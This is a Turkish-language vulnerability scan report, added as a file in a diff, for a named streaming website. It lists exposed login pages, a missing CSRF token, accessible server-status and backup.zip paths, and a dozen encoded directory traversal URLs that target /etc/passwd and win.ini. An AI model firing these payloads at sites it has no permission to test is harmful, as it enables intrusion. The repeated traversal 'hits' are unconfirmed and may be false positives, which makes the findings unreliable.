@@ -1,0 +1,56 @@
+🕵️ Cımbız Güvenlik Açığı Tarama Raporu
+Taranan URL: https://watchmmafull.com/
+Tarih: 2025-05-28_02-54-47
+--------------------------------------------------
+
+🔍 Admin Panel:
+⚠️ ⚠️ Açık Admin Paneli Bulundu: https://watchmmafull.com/admin/login
+⚠️ ⚠️ Açık Admin Paneli Bulundu: https://watchmmafull.com/login
+⚠️ ⚠️ Açık Admin Paneli Bulundu: https://watchmmafull.com/user/login
+----------------------------------------
+
+🔍 CSRF:
+⚠️ ⚠️ CSRF Token Eksik: 1. formda koruma bulunamadı.
+----------------------------------------
+
+🔍 Directory Traversal:
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=../../../../..//etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=../../../../../windows/win.ini
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%2f..%2f..%2f..%2f..%2f/etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%252f..%252f..%252f..%252f..%252f/etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%252f..%252f..%252f..%252f..%252fwindows/win.ini
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..\..\..\..\..\/etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..\..\..\..\..\windows/win.ini
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%5c..%5c..%5c..%5c..%5c/etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=..%5c..%5c..%5c..%5c..%5cwindows/win.ini
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+⚠️ ⚠️ Directory Traversal Açığı: https://watchmmafull.com?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini
+----------------------------------------
+
+🔍 SQLi:
+✅ Açık bulunamadı.
+----------------------------------------
+
+🔍 XSS:
+✅ Açık bulunamadı.
+----------------------------------------
+
+🔍 Server Misconfig:
+⚠️ ⚠️ Sunucu bilgisi ifşa edilmiş: cloudflare
+⚠️ ⚠️ Tehlikeli dosya veya yapılandırma erişilebilir: https://watchmmafull.com/server-status
+⚠️ ⚠️ Tehlikeli dosya veya yapılandırma erişilebilir: https://watchmmafull.com/backup.zip
+----------------------------------------
+
+🔍 Open Redirect:
+✅ Açık bulunamadı.
+----------------------------------------
+
+🔍 CMDi:
+✅ Açık bulunamadı.
+----------------------------------------
+
+🔍 Network Ports:
+⚠️ ⚠️ Port 80 açık
+⚠️ ⚠️ Port 443 açık
+----------------------------------------
